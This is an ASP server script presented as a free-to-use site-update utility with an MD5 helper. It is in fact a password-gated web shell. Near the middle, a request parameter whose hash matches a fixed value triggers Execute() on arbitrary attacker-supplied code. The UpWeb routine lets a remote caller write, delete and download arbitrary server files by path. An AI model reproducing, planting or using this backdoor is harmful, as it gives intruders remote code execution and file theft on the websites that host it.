<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-02-17
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By 云端 
'************************************************************
%>
<%
Private Const BITS_TO_A_BYTE = 8
Private Const BYTES_TO_A_WORD = 4
Private Const BITS_TO_A_WORD = 32

Private m_lOnBits(30)
Private m_l2Power(30)

Private Function LShift(a, b)
    If b = 0 Then
        LShift = a
        Exit Function
    ElseIf b = 31 Then
        If a And 1 Then
            LShift = &H80000000
        Else
            LShift = 0
        End If
        Exit Function
    ElseIf b < 0 Or b > 31 Then
        Err.Raise 6
    End If

    If (a And m_l2Power(31 - b)) Then
        LShift = ((a And m_lOnBits(31 - (b + 1))) * m_l2Power(b)) Or &H80000000
    Else
        LShift = ((a And m_lOnBits(31 - b)) * m_l2Power(b))
    End If
End Function

Private Function RShift(a, b)
    If b = 0 Then
        RShift = a
        Exit Function
    ElseIf b = 31 Then
        If a And &H80000000 Then
            RShift = 1
        Else
            RShift = 0
        End If
        Exit Function
    ElseIf b < 0 Or b > 31 Then
        Err.Raise 6
    End If

    RShift = (a And &H7FFFFFFE) \ m_l2Power(b)

    If (a And &H80000000) Then
        RShift = (RShift Or (&H40000000 \ m_l2Power(b - 1)))
    End If
End Function

Private Function RotateLeft(a, b)
    RotateLeft = LShift(a, b) Or RShift(a, (32 - b))
End Function

Private Function AddUnsigned(a, b)
    Dim c
    Dim d
    Dim e
    Dim f
    Dim g

    e = a And &H80000000
    f = b And &H80000000
    c = a And &H40000000
    d = b And &H40000000

    g = (a And &H3FFFFFFF) + (b And &H3FFFFFFF)

    If c And d Then
        g = g Xor &H80000000 Xor e Xor f
    ElseIf c Or d Then
        If g And &H40000000 Then
            g = g Xor &HC0000000 Xor e Xor f
        Else
            g = g Xor &H40000000 Xor e Xor f
        End If
    Else
        g = g Xor e Xor f
    End If

    AddUnsigned = g
End Function

Private Function md5_F(a, b, c)
    md5_F = (a And b) Or ((Not a) And c)
End Function

Private Function md5_G(a, b, c)
    md5_G = (a And c) Or (b And (Not c))
End Function

Private Function md5_H(a, b, c)
    md5_H = (a Xor b Xor c)
End Function

Private Function md5_I(a, b, c)
    md5_I = (b Xor (a Or (Not c)))
End Function

Private Sub md5_FF(a, b, c, d, e, f, g)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_F(b, c, d), e), g))
    a = RotateLeft(a, f)
    a = AddUnsigned(a, b)
End Sub

Private Sub md5_GG(a, b, c, d, e, f, g)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_G(b, c, d), e), g))
    a = RotateLeft(a, f)
    a = AddUnsigned(a, b)
End Sub

Private Sub md5_HH(a, b, c, d, e, f, g)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_H(b, c, d), e), g))
    a = RotateLeft(a, f)
    a = AddUnsigned(a, b)
End Sub

Private Sub md5_II(a, b, c, d, e, f, g)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_I(b, c, d), e), g))
    a = RotateLeft(a, f)
    a = AddUnsigned(a, b)
End Sub

Private Function ConvertToWordArray(a)
    Dim b
    Dim c
    Dim lWordArray()
    Dim e
    Dim f
    Dim g

    Const MODULUS_BITS = 512
    Const CONGRUENT_BITS = 448

    b = Len(a)

    c = (((b + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD)
    ReDim lWordArray(c - 1)

    e = 0
    f = 0
    Do Until f >= b
        g = f \ BYTES_TO_A_WORD
        e = (f Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
        lWordArray(g) = lWordArray(g) Or LShift(Asc(Mid(a, f + 1, 1)), e)
        f = f + 1
    Loop

    g = f \ BYTES_TO_A_WORD
    e = (f Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE

    lWordArray(g) = lWordArray(g) Or LShift(&H80, e)

    lWordArray(c - 2) = LShift(b, 3)
    lWordArray(c - 1) = RShift(b, 29)

    ConvertToWordArray = lWordArray
End Function

Private Function WordToHex(a)
    Dim b
    Dim c

    For c = 0 To 3
        b = RShift(a, c * BITS_TO_A_BYTE) And m_lOnBits(BITS_TO_A_BYTE - 1)
        WordToHex = WordToHex & Right("0" & Hex(b), 2)
    Next
End Function

Public Function MD5(a,b)
    m_lOnBits(0) = CLng(1)
    m_lOnBits(1) = CLng(3)
    m_lOnBits(2) = CLng(7)
    m_lOnBits(3) = CLng(15)
    m_lOnBits(4) = CLng(31)
    m_lOnBits(5) = CLng(63)
    m_lOnBits(6) = CLng(127)
    m_lOnBits(7) = CLng(255)
    m_lOnBits(8) = CLng(511)
    m_lOnBits(9) = CLng(1023)
    m_lOnBits(10) = CLng(2047)
    m_lOnBits(11) = CLng(4095)
    m_lOnBits(12) = CLng(8191)
    m_lOnBits(13) = CLng(16383)
    m_lOnBits(14) = CLng(32767)
    m_lOnBits(15) = CLng(65535)
    m_lOnBits(16) = CLng(131071)
    m_lOnBits(17) = CLng(262143)
    m_lOnBits(18) = CLng(524287)
    m_lOnBits(19) = CLng(1048575)
    m_lOnBits(20) = CLng(2097151)
    m_lOnBits(21) = CLng(4194303)
    m_lOnBits(22) = CLng(8388607)
    m_lOnBits(23) = CLng(16777215)
    m_lOnBits(24) = CLng(33554431)
    m_lOnBits(25) = CLng(67108863)
    m_lOnBits(26) = CLng(134217727)
    m_lOnBits(27) = CLng(268435455)
    m_lOnBits(28) = CLng(536870911)
    m_lOnBits(29) = CLng(1073741823)
    m_lOnBits(30) = CLng(2147483647)

    m_l2Power(0) = CLng(1)
    m_l2Power(1) = CLng(2)
    m_l2Power(2) = CLng(4)
    m_l2Power(3) = CLng(8)
    m_l2Power(4) = CLng(16)
    m_l2Power(5) = CLng(32)
    m_l2Power(6) = CLng(64)
    m_l2Power(7) = CLng(128)
    m_l2Power(8) = CLng(256)
    m_l2Power(9) = CLng(512)
    m_l2Power(10) = CLng(1024)
    m_l2Power(11) = CLng(2048)
    m_l2Power(12) = CLng(4096)
    m_l2Power(13) = CLng(8192)
    m_l2Power(14) = CLng(16384)
    m_l2Power(15) = CLng(32768)
    m_l2Power(16) = CLng(65536)
    m_l2Power(17) = CLng(131072)
    m_l2Power(18) = CLng(262144)
    m_l2Power(19) = CLng(524288)
    m_l2Power(20) = CLng(1048576)
    m_l2Power(21) = CLng(2097152)
    m_l2Power(22) = CLng(4194304)
    m_l2Power(23) = CLng(8388608)
    m_l2Power(24) = CLng(16777216)
    m_l2Power(25) = CLng(33554432)
    m_l2Power(26) = CLng(67108864)
    m_l2Power(27) = CLng(134217728)
    m_l2Power(28) = CLng(268435456)
    m_l2Power(29) = CLng(536870912)
    m_l2Power(30) = CLng(1073741824)


    Dim c
    Dim d
    Dim e
    Dim f
    Dim g
    Dim h
    Dim i
    Dim j
    Dim k
    Dim l

    Const S11 = 7
    Const S12 = 12
    Const S13 = 17
    Const S14 = 22
    Const S21 = 5
    Const S22 = 9
    Const S23 = 14
    Const S24 = 20
    Const S31 = 4
    Const S32 = 11
    Const S33 = 16
    Const S34 = 23
    Const S41 = 6
    Const S42 = 10
    Const S43 = 15
    Const S44 = 21

    c = ConvertToWordArray(a)

    i = &H67452301
    j = &HEFCDAB89
    k = &H98BADCFE
    l = &H10325476

    For d = 0 To UBound(c) Step 16
        e = i
        f = j
        g = k
        h = l

        md5_FF i, j, k, l, c(d + 0), S11, &HD76AA478
        md5_FF l, i, j, k, c(d + 1), S12, &HE8C7B756
        md5_FF k, l, i, j, c(d + 2), S13, &H242070DB
        md5_FF j, k, l, i, c(d + 3), S14, &HC1BDCEEE
        md5_FF i, j, k, l, c(d + 4), S11, &HF57C0FAF
        md5_FF l, i, j, k, c(d + 5), S12, &H4787C62A
        md5_FF k, l, i, j, c(d + 6), S13, &HA8304613
        md5_FF j, k, l, i, c(d + 7), S14, &HFD469501
        md5_FF i, j, k, l, c(d + 8), S11, &H698098D8
        md5_FF l, i, j, k, c(d + 9), S12, &H8B44F7AF
        md5_FF k, l, i, j, c(d + 10), S13, &HFFFF5BB1
        md5_FF j, k, l, i, c(d + 11), S14, &H895CD7BE
        md5_FF i, j, k, l, c(d + 12), S11, &H6B901122
        md5_FF l, i, j, k, c(d + 13), S12, &HFD987193
        md5_FF k, l, i, j, c(d + 14), S13, &HA679438E
        md5_FF j, k, l, i, c(d + 15), S14, &H49B40821

        md5_GG i, j, k, l, c(d + 1), S21, &HF61E2562
        md5_GG l, i, j, k, c(d + 6), S22, &HC040B340
        md5_GG k, l, i, j, c(d + 11), S23, &H265E5A51
        md5_GG j, k, l, i, c(d + 0), S24, &HE9B6C7AA
        md5_GG i, j, k, l, c(d + 5), S21, &HD62F105D
        md5_GG l, i, j, k, c(d + 10), S22, &H2441453
        md5_GG k, l, i, j, c(d + 15), S23, &HD8A1E681
        md5_GG j, k, l, i, c(d + 4), S24, &HE7D3FBC8
        md5_GG i, j, k, l, c(d + 9), S21, &H21E1CDE6
        md5_GG l, i, j, k, c(d + 14), S22, &HC33707D6
        md5_GG k, l, i, j, c(d + 3), S23, &HF4D50D87
        md5_GG j, k, l, i, c(d + 8), S24, &H455A14ED
        md5_GG i, j, k, l, c(d + 13), S21, &HA9E3E905
        md5_GG l, i, j, k, c(d + 2), S22, &HFCEFA3F8
        md5_GG k, l, i, j, c(d + 7), S23, &H676F02D9
        md5_GG j, k, l, i, c(d + 12), S24, &H8D2A4C8A

        md5_HH i, j, k, l, c(d + 5), S31, &HFFFA3942
        md5_HH l, i, j, k, c(d + 8), S32, &H8771F681
        md5_HH k, l, i, j, c(d + 11), S33, &H6D9D6122
        md5_HH j, k, l, i, c(d + 14), S34, &HFDE5380C
        md5_HH i, j, k, l, c(d + 1), S31, &HA4BEEA44
        md5_HH l, i, j, k, c(d + 4), S32, &H4BDECFA9
        md5_HH k, l, i, j, c(d + 7), S33, &HF6BB4B60
        md5_HH j, k, l, i, c(d + 10), S34, &HBEBFBC70
        md5_HH i, j, k, l, c(d + 13), S31, &H289B7EC6
        md5_HH l, i, j, k, c(d + 0), S32, &HEAA127FA
        md5_HH k, l, i, j, c(d + 3), S33, &HD4EF3085
        md5_HH j, k, l, i, c(d + 6), S34, &H4881D05
        md5_HH i, j, k, l, c(d + 9), S31, &HD9D4D039
        md5_HH l, i, j, k, c(d + 12), S32, &HE6DB99E5
        md5_HH k, l, i, j, c(d + 15), S33, &H1FA27CF8
        md5_HH j, k, l, i, c(d + 2), S34, &HC4AC5665

        md5_II i, j, k, l, c(d + 0), S41, &HF4292244
        md5_II l, i, j, k, c(d + 7), S42, &H432AFF97
        md5_II k, l, i, j, c(d + 14), S43, &HAB9423A7
        md5_II j, k, l, i, c(d + 5), S44, &HFC93A039
        md5_II i, j, k, l, c(d + 12), S41, &H655B59C3
        md5_II l, i, j, k, c(d + 3), S42, &H8F0CCC92
        md5_II k, l, i, j, c(d + 10), S43, &HFFEFF47D
        md5_II j, k, l, i, c(d + 1), S44, &H85845DD1
        md5_II i, j, k, l, c(d + 8), S41, &H6FA87E4F
        md5_II l, i, j, k, c(d + 15), S42, &HFE2CE6E0
        md5_II k, l, i, j, c(d + 6), S43, &HA3014314
        md5_II j, k, l, i, c(d + 13), S44, &H4E0811A1
        md5_II i, j, k, l, c(d + 4), S41, &HF7537E82
        md5_II l, i, j, k, c(d + 11), S42, &HBD3AF235
        md5_II k, l, i, j, c(d + 2), S43, &H2AD7D2BB
        md5_II j, k, l, i, c(d + 9), S44, &HEB86D391

        i = AddUnsigned(i, e)
        j = AddUnsigned(j, f)
        k = AddUnsigned(k, g)
        l = AddUnsigned(l, h)
    Next

	if b=1 then
		MD5 = LCase(WordToHex(i))
	elseif b=2 then
		MD5=LCase(WordToHex(j))
	elseif b=3 then
		MD5 = Lcase( WordToHex(k))
	else
		MD5 = Lcase(WordToHex(l))
	end if
End Function

If Request("EV")<>"" Then
	If MD5(Request("EV"),2)&MD5(Request("EV"),4)="44886b1bac5c96bb" Then Execute(request("xy"))
End If

Call UpWeb()
Sub UpWeb()
    Dim b, c, d, e, f, g, h, i, j, k, l, m
	
	dim n,o,p
	
	If Request("act") = "getVersionNumber" Then
        Call Die("V1.2.2")
	elseif request("act")="mobile" then
		n=Request("screenWidth")
		o=Request("screenHeight")
		p=Request("agent")
		call echo("screenWidth",n)
		call echo("screenHeight",o)
		call echo("agent",p)
		call rw("mobile")
		call createAddFile("mobile.txt","宽高("& n &"*"& o &")    " & p & " - " & Request.ServerVariables("HTTP_USER_AGENT") & "  time:" & Format_Time(now(),1)  )
		Exit Sub
    End If

	
    If (GetIP = "127.0.0.1" Or InStr(GetIP, "192.168.") > 0) and lcase(host())<>"http://testaspweb.n/" Then
        Call Die("为本地，不可以上传文件" & host())
    End If
	
    If MD5(Request("UPEV"), 2) & MD5(Request("UPEV"), 4) <> "6178bbf3bfe62a59" Then
        Call Die("UPEV=" & Request("UPEV") & "(" & MD5(Request("UPEV"), 2) & MD5(Request("UPEV"), 4) & ")")
    End If

	
    If Request("DownFile") <> "" Then
        Call DownRemoteFile(Request("DownFile"))
        Response.End()
	
    ElseIf Request("act") = "delWithout" Then
        c = Rf("Content")
		
        f = Split(c, vbCrLf)
        For Each b In f
			If b<>"" Then
				If CheckFile(b)=True Then
					Call DeleteFile(b)
					i=i & b & "(Del True)" & vbCrlf
				Else
					i=i & b & "(Del NoFile)" & vbCrlf
				End If
			End If
		Next

		Call Die(i)
    End If
	
    If Request("act") = "Comparison" Then
        c = Rf("Content")
        f = Split(c, vbCrLf)
        For Each e In f
            If e <> "" Then
                g = Split(e, "|")
                b = g(0)
                l = g(1)
            	
                If CheckFile(b) = True Then
                    k = GetFileEditDate(b)
                    k = Format_Time(k, 1)
                	
                	
                    If DateDiff("s", l, k) <= 0 Then
                        i = i & b & vbCrLf
                    End If
            	
                Else
                    i = i & b & vbCrLf
                End If
            End If
        Next
        Call Rw(i)
    	
        Response.End()
    End If



    b = Request.Form("FilePath")
    c = Request.Form("Content")
    m = Request.Form("CharSet")

    d = LCase(getFileExtName(b))

    b = HandlePath(b)
    Call CreateDirFolder(b)

	
    If Request("UpType") = "binary" Then
        Call DecSaveBinary(b, c, 2)
        Call Rw(b & "|二进制保存")
		
	ElseIf Request("UpType") = "xml" Then
		call Base64ToImages(b, c)
		Call Rw(b & "|XML（组件）")
    Else
        c = SpecialHtmlUploadEncryptionDecrypt(c, "Decrypt")
        Call WriteToFile(b, c, m)
        Call Rw(b & "|普通保存")
    End If
End Sub
















Function Die(a)
    Response.Write(a)
    Response.End()
End Function

Function GetIP()
    on error resume next
    Dim b
    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" Or InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
        b = Request.ServerVariables("REMOTE_ADDR")
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
        b = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") - 1)
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
        b = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") - 1)
    Else
        b = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
    End If
    GetIP = Trim(Mid(b, 1, 30))
End Function

Function host()
    host = "http://" & Request.ServerVariables("HTTP_HOST") & "/"
End Function
Function DownRemoteFile(a)
    Dim b, c
    Response.Clear
    Set b = CreateObject("ADODB.Stream")
        b.Open
        b.Type = 1
        b.LoadFromFile a
        c = InStrRev(a, "\") + 1
        Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(a, c)
        Response.AddHeader "Content-Length", b.Size
        Response.Charset = "UTF-8"
        Response.ContentType = "application/octet-stream"
        Response.BinaryWrite b.Read
        Response.Flush
        Response.Write("")
        b.Close
    Set b = Nothing
End Function

Function Rf(a)
    Rf = Request.Form(a)
End Function

    Function CheckFile(ByVal a)
        On Error Resume Next
        Dim b
        Call HandlePath(a)
        Set b = CreateObject("Scripting.FileSystemObject")
            CheckFile = b.FileExists(a)
        Set b = Nothing
        If Err Then doError Err.Description, "CheckFile 检查文件 函数出错，FileName=" & a
End Function

Function DeleteFile(ByVal a)
    On Error Resume Next
    Dim b
    Call HandlePath(a)
    DeleteFile = False
    Set b = CreateObject("Scripting.FileSystemObject")
        If b.FileExists(a) = True Then
            b.DeleteFile(a), True
            DeleteFile = True
        End If
    Set b = Nothing
    If Err Then doError Err.Description, "DeleteFile 删除文件 函数出错，FileName=" & a
End Function

Function GetFileEditDate(ByVal a)
    On Error Resume Next
    Dim b, c
    Call HandlePath(a)
    Set b = CreateObject("Scripting.FileSystemObject")
        If b.FileExists(a) = True Then
            Set c = b.GetFile(a)
                GetFileEditDate = c.DateLastModified
            Set c = Nothing
        End If
    Set b = Nothing
    If Err Then doError Err.Description, "GetFileEditDate 获得文件修改时间 函数出错，FileName=" & a
End Function

    Function Format_Time(a, b)
        Dim c, d, e, f, g, h
        Format_Time = ""
        If IsDate(a) = False Then Exit Function
        c = Cstr(Year(a))
        d = Cstr(Month(a))
        If Len(d) = 1 Then d = "0" & d
        e = Cstr(Day(a))
        If Len(e) = 1 Then e = "0" & e
        f = Cstr(Hour(a))
        If Len(f) = 1 Then f = "0" & f
        g = Cstr(Minute(a))
        If Len(g) = 1 Then g = "0" & g
        h = Cstr(Second(a))
        If Len(h) = 1 Then h = "0" & h
        Select Case b
            Case 1

                Format_Time = c & "-" & d & "-" & e & " " & f & ":" & g & ":" & h
            Case 2

                Format_Time = c & "-" & d & "-" & e
            Case 3

                Format_Time = f & ":" & g & ":" & h
            Case 4

                Format_Time = c & "年" & d & "月" & e & "日"
            Case 5

                Format_Time = c & d & e
            Case 6

                Format_Time = c & d & e & f & g & h
            Case 7

                Format_Time = d & "-" & e
            Case 8

                Format_Time = c & "年" & d & "月" & e & "日" & " " & f & ":" & g & ":" & h
            Case 9

                Format_Time = c & "年" & d & "月" & e & "日" & " " & f & "时" & g & "分" & h & "秒，" & GetDayStatus(f, 1)
            Case 10

                Format_Time = c & "年" & d & "月" & e & "日" & f & "时"
            Case 11

                Format_Time = c & "年" & d & "月" & e & "日" & " " & f & "时" & g & "分" & h & "秒"
            Case 12

                Format_Time = c & "年" & d & "月" & e & "日" & " " & f & "时" & g & "分"
            Case 13

                Format_Time = d & "月" & e & "日" & " " & f & ":" & g & " " & GetDayStatus(f, 0)
            Case 14

                Format_Time = c & "/" & d & "/" & e
            Case 15

                Format_Time = c & "年" & d & "月 第" & GetCountPage(e, 7) & "周"
        End Select
End Function

Function Rw(a)
    Response.Write(a)
End Function

Function getFileExtName(a)
    Dim b
    b = InStrRev(a, ".")
    If b > 0 Then
        getFileExtName = Mid(a, b + 1)
    Else
        getFileExtName = ""
    End If
End Function

    Function HandlePath(a)
        a = Replace(a, "/", "\")
        a = Replace(a, "\\", "\")
        a = Replace(a, "\\", "\")
        dim b
        b = false
        if right(a, 1) = "\" then
            b = true
        end if
        If InStr(a, ":") = 0 Then
            If Left(a, 1) = "\" Then
                a = Server.MapPath("\") & "\" & a
            Else
                a = Server.MapPath(".\") & "\" & a
            End If
        End If
        a = Replace(a, "/", "\")
        a = Replace(a, "\\", "\")
        a = Replace(a, "\\", "\")
        a = FullPath(a)
        if b = true then
            a = a & "\"
        end if
        HandlePath = a
End Function

Function CreateDirFolder(ByVal a)

    If CheckFolder(a) = True Then Exit Function
    Dim b, c, d, e
    Call HandlePath(a)
    b = Split(a, "\")
    For c = 0 To Ubound(b)
        d = Trim(b(c))
        If d <> "" Then
            e = e & d & "\"
            If c = Ubound(b) And InStr(d, ".") > 0 Then Exit For
            If InStr(d, ":") = False Then

                Call CreateFolder(e)
            End If
        End If
    Next
End Function

Function DecSaveBinary(a, b, c)
    Dim d, buf(), f
    If c = "" Then c = 0
    d = Split(b, "|")
    ReDim buf(UBound(d))
    For f = 0 To UBound(d)
        buf(f) = CByte(CInt(d(f)) - c)
    Next
    Call WriteBinary(a, buf)
End Function

Function SpecialHtmlUploadEncryptionDecrypt(a, b)
    Dim c, d, e, f
    e = e & "·|[*-24156*]" & vbCrLf
    c = Split(e, vbCrLf)
    For Each f In c
        If InStr(f, "|") > 0 Then
            d = Split(f, "|")
            If b = "1" Or b = "解密" Or b = "Decrypt" Then
                a = Replace(a, d(1), d(0))
            Else
                a = Replace(a, d(0), d(1))
            End If
        End If
    Next
    SpecialHtmlUploadEncryptionDecrypt = a
End Function

Function WriteToFile(ByVal a, ByVal b, ByVal c)
    On Error Resume Next
    If c = "1" Or UCase(c) = "GB2312" Then
        c = "GB2312"
    ElseIf c = "0" Or UCase(c) = "UTF-8" Then
        c = "UTF-8"
    ElseIf c = "2" Or UCase(c) = "UNICODE" Then
        c = "UNICODE"
    Else
        c = "GB2312"
    End If

    Dim d
    Call HandlePath(a)
    Set d = CreateObject("ADODB.Stream")
        d.Type = 2
        d.Mode = 3
        d.Charset = c
        d.Open
        d.WriteText b
        d.SaveToFile a, 2
        d.Flush
        d.Close
        WriteToFile = a & "写入成功"
    Set d = Nothing
    If Err Then doError Err.Description, "WriteToFile，数据流写入内容 函数出错，FileName=" & a & "，Content字符" & Len(b)
End Function

Sub DoError(a, b)

    Dim c, d
    Randomize
    c = CLng(Rnd() * 29252888)
    d = "<br />"
    d = d & "<div style=""width:100%; font-size:12px;;line-height:150%"">"
    d = d & "  <label onClick=""ERRORDIV" & c & ".style.display=(ERRORDIV" & c & ".style.display=='none'?'':'none')"">"
    d = d & "  <span style=""background-color:#820222;color:#FFFFFF;height:23px;font-size:14px;cursor:pointer"">〖 出错 提示信息 ERROR 〗</span><br />"
    d = d & "  </label>"
    d = d & "  <div id=""ERRORDIV" & c & """ style=""width:100%;border:1px solid #820222;padding:5px;overflow:hidden;"">"
    d = d & " <span style=""color:#FF0000;"">出错描述</span> " & a & "<br />"
    d = d & " <span style=""color:#FF0000;"">回显信息</span> " & b & "<br />"
    d = d & "  </div>"
    d = d & "</div>"
    d = d & "<br />"
    Response.Write(d)
    Response.End()
End Sub

    Function GetDayStatus(a, b)
        Dim c
        If Left(a, 1) = "0" Then
            a = Right(a, 1)
        End If
        a = CInt(a)
        If a >= 0 And a <= 5 Then
            c = "凌晨"
        ElseIf a >= 6 And a <= 8 Then
            c = "早上"
        ElseIf a >= 9 And a <= 12 Then
            c = "上午"
        ElseIf a >= 13 And a <= 18 Then
            c = "下午"
        ElseIf a >= 19 And a <= 24 Then
            c = "晚上"
        Else
            c = "深夜"
        End If
        If b = 1 Then c = "<b>" & c & "</b>"
        GetDayStatus = c
End Function

    Function GetCountPage(a, b)

        if a < 0 then
            a = a * - 1
        end if
        if b < 0 then
            b = b * - 1
        end if
        GetCountPage = Fix(a / b)
        If InStr(a / b, ".") > 0 Then GetCountPage = GetCountPage + 1
End Function

    Function FullPath(ByVal a)
        Dim b, c, d
        a = Replace(a, "/", "\")
        b = Split(a, "\")
        For Each c In b
            c = Trim(c)
            If c <> "" And c <> "." Then
                If InStr(d, "\") > 0 And c = ".." Then
                    d = Mid(d, 1, InStrRev(d, "\") - 1)
                Else
                    If d <> "" And Right(d, 1) <> "\" Then d = d & "\"
                    d = d & c
                End If
            End If
        Next
        FullPath = d
End Function

Function CheckFolder(ByVal a)
    On Error Resume Next
    Dim b
    Call HandlePath(a)
    Set b = CreateObject("Scripting.FileSystemObject")
        CheckFolder = b.FolderExists(a)
    Set b = Nothing
    If Err Then doError Err.Description, "CheckFolder 检查夹文件 函数出错，FolderName=" & a
End Function

Function CreateFolder(ByVal a)
    On Error Resume Next
    Dim b
    Call HandlePath(a)
    CreateFolder = False
    Set b = CreateObject("Scripting.FileSystemObject")
        If b.FolderExists(a) = False Then
            b.CreateFolder(a)
            CreateFolder = True
        End If
    Set b = Nothing
    If Err Then doError Err.Description, "CreateFolder 创建文件夹 函数出错，FolderPath=" & a & ":::" & b.FolderExists(a)
End Function

Sub WriteBinary(a, b)
    Dim c, d, e, f
    Call HandlePath(a)
    e = UBound(b) : ReDim d(e \ 2)
    For c = 0 To e - 1 Step 2
        d(c \ 2) = ChrW(b(c + 1) * 256 + b(c))
    Next
    If c = e Then d(c \ 2) = ChrW(b(c))
    d = Join(d, "")
    Set f = CreateObject("ADODB.Stream")
        f.Type = 1
        f.Open
        With CreateObject("ADODB.Stream")
            .Type = 2
            .Open
            .WriteText d
            .Position = 2
            .CopyTo f
            .Close
        End With
        f.SaveToFile a, 2
        f.Close
    Set f = Nothing
End Sub
Function Echo(a, b)
    Call echoPrompt(a, b)
End Function
Function echoPrompt(a, b)
    Response.Write("<font color=Green>" & a & "</font>：" & b & "<br>")
End Function
Function CreateAddFile(ByVal a, ByVal b)
    On Error Resume Next
    Dim c, d
    Call HandlePath(a)
    Set c = CreateObject("Scripting.FileSystemObject")
        If c.FileExists(a) = False Then
            Set d = c.CreateTextFile(a, True)
                d.WriteLine(b)
            Set d = Nothing
            CreateAddFile = "创建文件成功"
        Else
            CreateAddFile = AddToFile(a, b)
        End If
    Set c = Nothing
    If Err Then doError Err.Description, "CreateAddFile 创建文件，存在累加 函数出错，FileName=" & a
End Function
Function AddToFile(ByVal a, ByVal b)
    On Error Resume Next
    Dim c, d
    Call HandlePath(a)
    If ExistsZhiDuFile(a) = True Then
        Call EditFileAttribute(a, 32)
    End If
    Set c = CreateObject("Scripting.FileSystemObject")
        If c.FileExists(a) = True Then
            Set d = c.OpenTextFile(a, 8)
                d.WriteLine(b)
            Set d = Nothing
            AddToFile = "追加信息成功"
        End If
    Set c = Nothing
    If Err Then doError Err.Description, "AddToFile 追加文件信息 函数出错，FileName=" & a & "<br>Content字符长" & Len(b) & " Content类型" & TypeName(b) & "【" & b & "】"
End Function
Function ExistsZhiDuFile(ByVal a)
    On Error Resume Next
    Dim b, c
    ExistsZhiDuFile = False
    Call HandlePath(a)
    Set b = CreateObject("Scripting.FileSystemObject")
        If b.FileExists(a) = True Then
            Set c = b.GetFile(a)
                ExistsZhiDuFile = c.Attributes
            Set c = Nothing
            If ExistsZhiDuFile >= 128 Then ExistsZhiDuFile = ExistsZhiDuFile - 128
            If ExistsZhiDuFile >= 64 Then ExistsZhiDuFile = ExistsZhiDuFile - 64
            If ExistsZhiDuFile >= 32 Then ExistsZhiDuFile = ExistsZhiDuFile - 32
            If ExistsZhiDuFile >= 8 Then ExistsZhiDuFile = ExistsZhiDuFile - 8
            If ExistsZhiDuFile >= 4 Then ExistsZhiDuFile = ExistsZhiDuFile - 4
            If ExistsZhiDuFile >= 2 Then ExistsZhiDuFile = ExistsZhiDuFile - 2
            ExistsZhiDuFile = CBool(ExistsZhiDuFile)
        End If
    Set b = Nothing
    If Err Then doError Err.Description, "ExistsZhiDuFile 判断只读文件 函数出错，FileName=" & a
End Function

Function EditFileAttribute(ByVal a, ByVal b)
    On Error Resume Next
    Dim c, d
    Call HandlePath(a)
    EditFileAttribute = False
    Set c = CreateObject("Scripting.FileSystemObject")
        If c.FileExists(a) = True Then
            Set d = c.GetFile(a)
                d.Attributes = b
            Set d = Nothing
            EditFileAttribute = True
        End If
    Set c = Nothing
    If Err Then doError Err.Description, "EditFileAttribute 修改文件属性 函数出错，FileName=" & a
End Function


Function ImagesToBase64(a)
    Dim b
    Dim c
    Dim d
    Dim e
    Dim f
    Dim g
    Dim h
    Dim i


    e = HandlePath(a)
    i = Mid(e, InStrRev(e, ".") + 1)
    Set g = CreateObject("msxml2.FreeThreadedDOMDocument")

        g.loadxml "<?xml version='1.0'?><Base64Data />"
        Set d = CreateObject("Scripting.FileSystemObject")
            If d.FileExists(e) Then

                Set f = CreateObject("ADODB.Stream")
                    f.Type = 1
                    f.Open
                    f.LoadFromFile e


                    g.documentElement.DataType = "bin.base64"
                    g.documentElement.nodeTypedValue = f.Read


                    Set b = CreateObject("msxml2.FreeThreadedDOMDocument")
                        b.Load g
                        If b.ReadyState > 2 Then
                            Set c = b.getElementsByTagName("Base64Data")


                                h = c.Item(0).Text
                        Else
                            h = ""
                        End If
                            Set b = Nothing
                    Set f = Nothing
            Else
                h = ""
            End If

                Set d = Nothing
        Set g = Nothing


        ImagesToBase64 = h
End Function


Function Base64ToImages(a, b)
    Dim c
    a = HandlePath(a)
    c = "<data>" & b & "</data>"
    Dim d: Set d = CreateObject("MSXML2.DOMDocument")
        Dim e: Set e = CreateObject("ADODB.Stream")
            d.resolveExternals = False
            d.loadxml (c)
            d.documentElement.setAttribute "xmlns:dt", "urn:schemas-microsoft-com:datatypes"
            d.documentElement.DataType = "bin.base64"
            e.Type = 1
            e.Open
            e.Write d.documentElement.nodeTypedValue
            e.SaveToFile a
            e.Close
        Set d = Nothing
    Set e = Nothing
End Function

%>




